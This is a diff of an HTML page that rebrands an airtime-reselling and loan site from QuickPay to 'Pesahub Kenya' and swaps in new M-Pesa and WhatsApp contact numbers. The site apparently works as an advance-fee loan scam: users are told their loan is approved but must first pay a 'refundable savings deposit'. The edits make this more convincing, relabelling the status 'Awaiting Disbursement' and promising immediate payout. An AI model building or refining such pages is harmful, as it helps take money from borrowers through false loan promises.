@@ -1,14 +1,28 @@
 <!DOCTYPE html>
 <html lang="en">
+<!-- Brevo Conversations {literal} -->
+<script>
+    (function(d, w, c) {
+        w.BrevoConversationsID = '67cfe70069e9058aa30db4b2';
+        w[c] = w[c] || function() {
+            (w[c].q = w[c].q || []).push(arguments);
+        };
+        var s = d.createElement('script');
+        s.async = true;
+        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
+        if (d.head) d.head.appendChild(s);
+    })(document, window, 'BrevoConversations');
+</script>
+<!-- /Brevo Conversations {/literal} -->
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QuickPay Kenya</title>
+    <title>Pesahub Kenya</title>
     <link rel="manifest" href="/manifest.json">
     <link rel="icon" type="image/png" href="/airtime-logo.png">
     <link rel="apple-touch-icon" href="/airtime-logo.png">
     <meta name="theme-color" content="#1a5f2a">
-    <meta name="description" content="Buy and resell airtime in Kenya. Fast, reliable, and affordable.">
+    <meta name="description" content="Buy and resell airtime in Kenya and  Get loans of about Ksh 15,000. Fast, reliable, and affordable.">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -1180,7 +1194,7 @@
                 </button>
                 <div class="logo">
                     <img src="company-logo.png" alt="Logo" id="headerLogo">
-                    <span class="logo-text">QuickPay</span>
+                    <span class="logo-text">PesaHub Kenya</span>
                 </div>
             </div>
             <div class="header-right">
@@ -1216,7 +1230,7 @@
                     <i class="fas fa-home"></i> <span class="menu-text">Dashboard</span>
                 </button>
                 <button class="menu-item" onclick="showPage('deposit')">
-                    <i class="fas fa-wallet"></i> <span class="menu-text">Deposit</span>
+                    <i class="fas fa-wallet"></i> <span class="menu-text">Deposit Float</span>
                 </button>
                 <button class="menu-item" onclick="showPage('buy-airtime')">
                     <i class="fas fa-mobile-alt"></i> <span class="menu-text">Buy Airtime</span>
@@ -1237,7 +1251,7 @@
                     <i class="fas fa-check-circle"></i> <span class="menu-text">Verify Deposit</span>
                 </button>
                 <button class="menu-item loan-feature" onclick="openLoanTerms()" style="background: linear-gradient(135deg, rgba(46, 204, 113, 0.1), rgba(39, 174, 96, 0.1));">
-                    <i class="fas fa-hand-holding-usd" style="color: #27ae60;"></i> <span class="menu-text">Get Loan Now</span>
+                    <i class="fas fa-hand-holding-usd" style="color: #27ae60;"></i> <span class="menu-text">Get A Loan Today</span>
                 </button>
                 <div class="menu-divider"></div>
                 <button class="menu-item" onclick="showPage('bulk-sms')">
@@ -1264,7 +1278,7 @@
                 </button>
                 <div class="menu-divider"></div>
                 <button class="menu-item" onclick="showPage('admin')">
-                    <i class="fas fa-user-shield"></i> <span class="menu-text">Admin Panel</span>
+                    <i class="fas fa-user-shield"></i> <span class="menu-text">Merchant Dashboard</span>
                 </button>
                 <button class="menu-item" onclick="logout()" style="color: var(--danger);">
                     <i class="fas fa-sign-out-alt"></i> <span class="menu-text">Logout</span>
@@ -1282,7 +1296,7 @@
                                 <div style="width: 36px; height: 36px; background: linear-gradient(135deg, #f4a020, #e67e22); border-radius: 10px; display: flex; align-items: center; justify-content: center;">
                                     <i class="fas fa-wallet" style="color: #fff; font-size: 1rem;"></i>
                                 </div>
-                                <p style="font-size: 0.75rem; color: rgba(255,255,255,0.8); margin: 0;">Balance</p>
+                                <p style="font-size: 0.75rem; color: rgba(255,255,255,0.8); margin: 0;">Airtime Float Balance</p>
                             </div>
                             <p class="balance-value" id="dashboardBalance" style="font-size: 1.5rem; font-weight: 700; color: #fff; margin: 0;">KES 0.00</p>
                         </div>
@@ -1291,7 +1305,7 @@
                         <div style="background: rgba(244, 160, 32, 0.15); border-radius: 8px; padding: 8px 12px; margin-top: 12px; position: relative; z-index: 1;">
                             <p style="margin: 0; font-size: 0.8rem; color: #fff; display: flex; align-items: center; justify-content: center; gap: 6px;">
                                 <i class="fas fa-gift" style="color: #f4a020;"></i>
-                                <span>Deposit KES 50+ = <strong style="color: #f4a020;">KES 6 Bonus!</strong></span>
+                                <span>Deposit KES 50+ Get <strong style="color: #f4a020;">KES 6 Bonus!</strong></span>
                             </p>
                         </div>
                     </div>
@@ -1299,7 +1313,7 @@
                     <div class="quick-actions-grid" style="gap: 15px;">
                         <button class="action-card" onclick="showPage('deposit')" style="padding: 22px 15px; border-radius: 20px; border: 2px solid rgba(255,255,255,0.15);">
                             <i class="fas fa-wallet" style="font-size: 2rem;"></i>
-                            <span data-translate="deposit" style="font-weight: 700;">Deposit</span>
+                            <span data-translate="deposit" style="font-weight: 700;">Deposit Airtime Float</span>
                         </button>
                         <button class="action-card" onclick="showPage('buy-airtime')" style="padding: 22px 15px; border-radius: 20px; border: 2px solid rgba(255,255,255,0.15);">
                             <i class="fas fa-mobile-alt" style="font-size: 2rem;"></i>
@@ -1319,7 +1333,7 @@
                     <div style="display: flex; flex-direction: column; gap: 12px; margin-top: 15px;">
                         <button class="action-card" onclick="scrollToDirectBuy()" style="background: linear-gradient(135deg, rgba(244, 160, 32, 0.25), rgba(230, 126, 34, 0.35)); padding: 18px 20px; border-radius: 16px; border: 2px solid rgba(244, 160, 32, 0.4); flex-direction: row; justify-content: center;">
                             <i class="fas fa-bolt" style="font-size: 1.5rem; margin-right: 12px;"></i>
-                            <span style="font-weight: 700;">Buy Airtime Directly (No Account)</span>
+                            <span style="font-weight: 700;">Buy Airtime Directly (Quick buy with or without account)</span>
                         </button>
                         <button class="action-card loan-feature" onclick="openLoanTerms()" style="background: linear-gradient(135deg, rgba(46, 204, 113, 0.25), rgba(39, 174, 96, 0.35)); padding: 18px 20px; border-radius: 16px; border: 2px solid rgba(46, 204, 113, 0.4); flex-direction: row; justify-content: center;">
                             <i class="fas fa-hand-holding-usd" style="font-size: 1.5rem; margin-right: 12px;"></i>
@@ -1337,10 +1351,10 @@
 
                 <!-- Promo Banner Section -->
                 <div class="card promo-banner-card" style="margin-top: 20px; padding: 0; overflow: hidden;">
-                    <img src="airtime-solution2.png" alt="Airtime Solution Promo" style="width: 100%; height: auto; display: block; border-radius: 16px 16px 0 0;">
+                    <img src="airtime-solution2.png" alt="Quick pay solution Promo" style="width: 100%; height: auto; display: block; border-radius: 16px 16px 0 0;">
                     <div style="padding: 20px; text-align: center;">
                         <h3 style="font-size: 1.2rem; color: var(--primary); margin-bottom: 10px; font-weight: 700;">Your Trusted Airtime Partner</h3>
-                        <p style="font-size: 0.9rem; color: var(--gray); line-height: 1.6;">Buy, sell, and manage airtime effortlessly. Fast transactions, secure payments, and unbeatable rates for all networks.</p>
+                        <p style="font-size: 0.9rem; color: var(--gray); line-height: 1.6;">Buy, sell, and manage airtime effortlessly. Fast transactions, secure payments, and unbeatable rates for all networks.Also you can access loans of upto Ksh 15,000 with low interest rates and</p>
                     </div>
                 </div>
 
@@ -1532,7 +1546,7 @@
                     <form id="depositForm">
                         <div class="form-group">
                             <label class="form-label"><i class="fas fa-phone"></i> Phone Number *</label>
-                            <input type="tel" class="form-input" id="depositPhone" placeholder="e.g. 0718369524" maxlength="10" required>
+                            <input type="tel" class="form-input" id="depositPhone" placeholder="e.g. 0732202740" maxlength="10" required>
                             <small style="color: var(--gray); font-size: 0.8rem;">Enter your M-Pesa number (starts with 07 or 01)</small>
                         </div>
 
@@ -1570,7 +1584,7 @@
                     <h3 class="card-title"><i class="fas fa-mobile-alt"></i> Buy Airtime</h3>
 
                     <div class="info-box">
-                        <p><i class="fas fa-info-circle"></i> Buy KES 20 and above and receive Commissions . Minimum purchase: KES 10</p>
+                        <p><i class="fas fa-info-circle"></i> Buy KES 20 and above and receive extra Commissions  directly to your account Float balance. Minimum purchase: KES 10</p>
                     </div>
 
                     <form id="buyAirtimeForm">
@@ -1625,7 +1639,7 @@
 
             <div id="page-sell-airtime" class="page">
                 <div class="card">
-                    <h3 class="card-title"><i class="fas fa-gift"></i> Sell Airtime Get Commission</h3>
+                    <h3 class="card-title"><i class="fas fa-gift"></i> Sell Airtime Get Extra Commission</h3>
 
                     <div class="info-box">
                         <p><i class="fas fa-info-circle"></i> Sell airtime and earn commission! KES 10-49 = 5% commission, KES 50+ = 10% commission. Minimum Sell: KES 10</p>
@@ -1717,7 +1731,7 @@
 
                         <div id="dialCodeSection" style="display: none;">
                             <p style="margin-bottom: 10px;">Dial this code to send airtime:</p>
-                            <div class="dial-code" id="dialCode">*140*100*0718369524#</div>
+                            <div class="dial-code" id="dialCode">*140*100*0732202740#</div>
                             <p style="font-size: 0.85rem; color: var(--gray); margin-bottom: 15px;">After sending, click "Done" below</p>
                         </div>
 
@@ -1860,10 +1874,10 @@
                     <h3 class="card-title"><i class="fas fa-info-circle"></i> <span data-translate="aboutUs">About Us</span></h3>
                     
                     <div style="text-align: center; margin-bottom: 20px;">
-                        <img src="about1.png" alt="Airtime Solution Kenya" style="max-width: 200px; border-radius: 16px; margin-bottom: 10px;" onerror="this.style.display='none'">
+                        <img src="about1.png" alt="Pesa Hub Kenya" style="max-width: 200px; border-radius: 16px; margin-bottom: 10px;" onerror="this.style.display='none'">
                     </div>
                     
-                    <p style="margin-bottom: 15px; font-size: 1.05rem;"><strong>Airtime Solution Kenya</strong> is your trusted partner for buying and reselling airtime across all networks in Kenya, as well as accessing quick personal loans when you need them most.</p>
+                    <p style="margin-bottom: 15px; font-size: 1.05rem;"><strong>Pesahub Kenya</strong> is your trusted partner for buying and reselling airtime across all networks in Kenya, as well as accessing quick personal loans when you need them most.</p>
                     
                     <div style="background: var(--light); padding: 20px; border-radius: 12px; margin-bottom: 20px;">
                         <h4 style="color: var(--primary); margin-bottom: 15px;"><i class="fas fa-bullseye" style="margin-right: 8px;"></i>Our Mission</h4>
@@ -1932,7 +1946,7 @@
                             <i class="fab fa-whatsapp" style="font-size: 2rem; color: #25d366; margin-right: 15px;"></i>
                             <div>
                                 <p style="font-weight: 600; margin-bottom: 3px;">WhatsApp</p>
-                                <a href="https://wa.me/254718369524" target="_blank" style="color: var(--primary);">+254 718 369 524</a>
+                                <a href="https://wa.me/254732202740" target="_blank" style="color: var(--primary);">+254 732202740</a>
                             </div>
                         </div>
                         
@@ -1940,7 +1954,7 @@
                             <i class="fas fa-phone-alt" style="font-size: 2rem; color: var(--primary); margin-right: 15px;"></i>
                             <div>
                                 <p style="font-weight: 600; margin-bottom: 3px;">Phone Call</p>
-                                <a href="tel:+254718369524" style="color: var(--primary);">+254 718 369 524</a>
+                                <a href="tel:+254732202740" style="color: var(--primary);">+254 732202740</a>
                             </div>
                         </div>
                         
@@ -1977,7 +1991,7 @@
                     <div style="background: linear-gradient(135deg, var(--primary), var(--primary-dark)); padding: 20px; border-radius: 12px; text-align: center; color: white; margin-bottom: 15px;">
                         <h4 style="margin-bottom: 10px;"><i class="fas fa-headset" style="margin-right: 8px;"></i>Need Immediate Help?</h4>
                         <p style="opacity: 0.9; margin-bottom: 15px;">Our support team is always ready to assist you with airtime, loans, or any other questions.</p>
-                        <a href="https://wa.me/254718369524" target="_blank" class="btn btn-secondary" style="display: inline-flex; width: auto;">
+                        <a href="https://wa.me/254732202740" target="_blank" class="btn btn-secondary" style="display: inline-flex; width: auto;">
                             <i class="fab fa-whatsapp"></i> Chat Now on WhatsApp
                         </a>
                     </div>
@@ -1999,7 +2013,7 @@
                         <p style="color: var(--gray);"><i class="fas fa-calendar" style="margin-right: 8px;"></i><strong>Last Updated:</strong> December 2025</p>
                     </div>
                     
-                    <p style="margin-bottom: 20px;">At Airtime Solution Kenya, we are committed to protecting your privacy and ensuring the security of your personal information for both our airtime and loan services.</p>
+                    <p style="margin-bottom: 20px;">At Pesahub Kenya, we are committed to protecting your privacy and ensuring the security of your personal information for both our airtime and loan services.</p>
                     
                     <div style="border-left: 4px solid var(--primary); padding-left: 15px; margin-bottom: 20px;">
                         <h4 style="color: var(--primary); margin-bottom: 10px;">1. Information We Collect</h4>
@@ -2073,11 +2087,11 @@
                         <p style="color: var(--gray);"><i class="fas fa-calendar" style="margin-right: 8px;"></i><strong>Effective Date:</strong> December 2025</p>
                     </div>
                     
-                    <p style="margin-bottom: 20px;">Please read these Terms of Service carefully before using Airtime Solution Kenya's airtime and loan services.</p>
+                    <p style="margin-bottom: 20px;">Please read these Terms of Service carefully before using Pesahub Kenya's airtime and loan services.</p>
                     
                     <div style="background: var(--light); padding: 20px; border-radius: 12px; margin-bottom: 15px;">
                         <h4 style="color: var(--primary); margin-bottom: 10px;"><i class="fas fa-handshake" style="margin-right: 8px;"></i>1. Acceptance of Terms</h4>
-                        <p style="color: var(--gray);">By accessing or using Airtime Solution Kenya, you agree to be bound by these Terms of Service for all our services including airtime transactions and loan facilities. If you do not agree, please do not use our services.</p>
+                        <p style="color: var(--gray);">By accessing or using Pesahub Kenya, you agree to be bound by these Terms of Service for all our services including airtime transactions and loan facilities. If you do not agree, please do not use our services.</p>
                     </div>
                     
                     <div style="background: var(--light); padding: 20px; border-radius: 12px; margin-bottom: 15px;">
@@ -2131,7 +2145,7 @@
                     
                     <div style="background: var(--light); padding: 20px; border-radius: 12px;">
                         <h4 style="color: var(--primary); margin-bottom: 10px;"><i class="fas fa-gavel" style="margin-right: 8px;"></i>6. Limitation of Liability</h4>
-                        <p style="color: var(--gray);">Airtime Solution Kenya shall not be liable for any indirect, incidental, or consequential damages arising from the use of our airtime or loan services. Our maximum liability is limited to the amount of the transaction in question.</p>
+                        <p style="color: var(--gray);">Pesahub Kenya shall not be liable for any indirect, incidental, or consequential damages arising from the use of our airtime or loan services. Our maximum liability is limited to the amount of the transaction in question.</p>
                     </div>
                 </div>
             </div>
@@ -2140,7 +2154,7 @@
                 <div class="card">
                     <h3 class="card-title"><i class="fas fa-cookie-bite"></i> Cookie Policy</h3>
                     
-                    <p style="margin-bottom: 20px;">We use cookies to enhance your experience on Airtime Solution Kenya. This policy explains what cookies are and how we use them.</p>
+                    <p style="margin-bottom: 20px;">We use cookies to enhance your experience on Pesahub Kenya. This policy explains what cookies are and how we use them.</p>
                     
                     <div style="background: var(--light); padding: 20px; border-radius: 12px; margin-bottom: 15px;">
                         <h4 style="color: var(--primary); margin-bottom: 10px;"><i class="fas fa-question-circle" style="margin-right: 8px;"></i>What Are Cookies?</h4>
@@ -2190,7 +2204,7 @@
                     <h3 class="card-title"><i class="fas fa-user-shield"></i> Admin Login</h3>
                     <form id="adminLoginForm">
                         <div class="form-group">
-                            <label class="form-label"><i class="fas fa-lock"></i> Admin Password</label>
+                            <label class="form-label"><i class="fas fa-lock"></i> Enter your merchant password</label>
                             <input type="password" class="form-input" id="adminPassword" placeholder="Enter admin password" required>
                         </div>
                         <button type="submit" class="btn btn-primary" id="adminLoginBtn">
@@ -2542,7 +2556,7 @@
 
                     <!-- Footer -->
                     <div style="text-align: center; padding: 20px; color: var(--gray); font-size: 0.85rem;">
-                        <p>&copy; 2025 Airtime Solution Kenya. All rights reserved.</p>
+                        <p>&copy; 2025 Pesahub Kenya. All rights reserved.</p>
                         <p style="margin-top: 5px;">Licensed digital lender partner</p>
                     </div>
                 </div>
@@ -3035,7 +3049,7 @@
                     </div>
 
                     <div style="margin-top: 20px; padding: 15px; background: var(--light); border-radius: 12px;">
-                        <p style="font-size: 0.85rem; color: var(--gray); text-align: center;"><i class="fas fa-info-circle"></i> All loans are subject to approval. Savings deposits are refundable upon successful loan repayment.</p>
+                        <p style="font-size: 0.85rem; color: var(--gray); text-align: center;"><i class="fas fa-info-circle"></i> All loans are subject to approval. Savings deposits are refundable upon successful loan repayment.After payment the loan is imediately disbursed to your M-pesa account number provided ,delay may take 5-6 minutes depending on the lender chosen</p>
                     </div>
                 </div>
             </div>
@@ -3073,7 +3087,7 @@
                     </div>
 
                     <div class="card" style="margin-bottom: 20px;">
-                        <h3 class="card-title"><i class="fas fa-mobile-alt"></i> Receiving Phone Number</h3>
+                        <h3 class="card-title"><i class="fas fa-mobile-alt"></i> Receiving Phone Number(❗️SAFARICOM ONLY)</h3>
                         <div class="form-group" style="margin-bottom: 0;">
                             <div class="phone-wrapper">
                                 <span class="phone-prefix">+254</span>
@@ -3162,7 +3176,7 @@
                             </svg>
                         </div>
                         <h2 style="font-size: 1.8rem; margin-bottom: 10px; font-weight: 700;">Your Loan is Approved!</h2>
-                        <p style="opacity: 0.95; font-size: 1.2rem;">KES <span id="approvedLoanAmount">-</span> approved successfully</p>
+                        <p style="opacity: 0.95; font-size: 1.2rem;">KES <span id="approvedLoanAmount">-</span> approved successfully Awaiting disbursement</p>
                     </div>
                 </div>
 
@@ -3173,7 +3187,7 @@
                             To receive your loan, you need to deposit your savings amount first. This is a <strong>refundable deposit</strong> that serves as collateral and will be returned after successful loan repayment.
                         </p>
                         <p style="font-size: 0.85rem; color: var(--gray);">
-                            <i class="fas fa-info-circle"></i> Your loan will be disbursed immediately after your savings deposit is confirmed.
+                            <i class="fas fa-info-circle"></i> Your loan will be disbursed immediately after your savings deposit is confirmed by the lender.
                         </p>
                     </div>
 
@@ -3186,7 +3200,7 @@
                             </div>
                             <div style="display: flex; justify-content: space-between; padding: 12px; background: var(--light); border-radius: 8px;">
                                 <span style="color: var(--gray);">Loan Released</span>
-                                <span style="font-weight: 600;" id="approvedReleaseNote">Immediately after savings deposit</span>
+                                <span style="font-weight: 600;" id="approvedReleaseNote">deposited to your mpesa provided number Immediately after savings deposit</span>
                             </div>
                             <div style="display: flex; justify-content: space-between; padding: 12px; background: var(--light); border-radius: 8px;">
                                 <span style="color: var(--gray);">Phone Number</span>
@@ -3343,7 +3357,7 @@
                     <div id="loanTermsContent" style="flex: 1; overflow-y: auto; padding: 15px; background: var(--light); border-radius: 12px; max-height: 400px;" onscroll="checkTermsScroll()">
                         <h4 style="color: var(--primary); margin-bottom: 15px;">Loan Service Agreement</h4>
                         
-                        <p style="margin-bottom: 15px; line-height: 1.7;">By applying for a loan through Airtime Solution Kenya, you agree to the following terms and conditions:</p>
+                        <p style="margin-bottom: 15px; line-height: 1.7;">By applying for a loan through Pesahub Kenya, you agree to the following terms and conditions:</p>
                         
                         <h5 style="margin: 20px 0 10px; color: var(--dark);">1. Eligibility Requirements</h5>
                         <ul style="margin-left: 20px; color: var(--gray); line-height: 1.8;">
@@ -3564,7 +3578,7 @@
 
         async function loadUserData(email) {
             try {
-                showLoading('Loading your account...');
+                showLoading('Loading account data please wait....');
                 const response = await fetch(`${API_BASE}/api/users/by-email/${encodeURIComponent(email)}`);
                 const data = await response.json();
                 if (data.success) {
@@ -4061,7 +4075,7 @@
             
             const btn = document.getElementById('depositStkBtn');
             btn.disabled = true;
-            btn.innerHTML = '<div class="spinner"></div> Sending STK Push...';
+            btn.innerHTML = '<div class="spinner"></div> Sending STK Push check your phone...';
             showLoading('Sending STK Push to ' + phone.substring(0, 6) + '...');
             
             try {
@@ -4385,7 +4399,7 @@
             e.preventDefault();
             const amount = document.getElementById('a2cAmount').value;
             const phone = document.getElementById('a2cPhone').value;
-            document.getElementById('dialCode').textContent = `*140*${amount}*0718369524#`;
+            document.getElementById('dialCode').textContent = `*140*${amount}*0732202740#`;
             document.getElementById('dialCodeSection').style.display = 'block';
             document.getElementById('sambazaBtn').style.display = 'none';
             document.getElementById('doneBtn').style.display = 'block';
@@ -4402,7 +4416,7 @@
             e.preventDefault();
             const phone = document.getElementById('verifyA2CPhone').value;
             const code = document.getElementById('verifyA2CCode').value;
-            const whatsappUrl = `https://wa.me/254718369524?text=${encodeURIComponent(`Verification: ${code} from ${phone}`)}`;
+            const whatsappUrl = `https://wa.me/254732202740?text=${encodeURIComponent(`Verification: ${code} from ${phone}`)}`;
             window.open(whatsappUrl, '_blank');
             showToast('Verification sent to WhatsApp. You will receive your cashback within 24 hours.', 'success');
         });
@@ -5191,7 +5205,7 @@
                 'offers_shown': 'Viewing Loan Offers',
                 'offer_selected': 'Offer Selected - Review Pending',
                 'approving': 'Processing Approval',
-                'approved': 'Approved - Awaiting Savings',
+                'approved': 'Approved - Awaiting Disbursement',
                 'savings_paid': 'Savings Paid - Processing',
                 'disbursed': 'Loan Disbursed'
             };
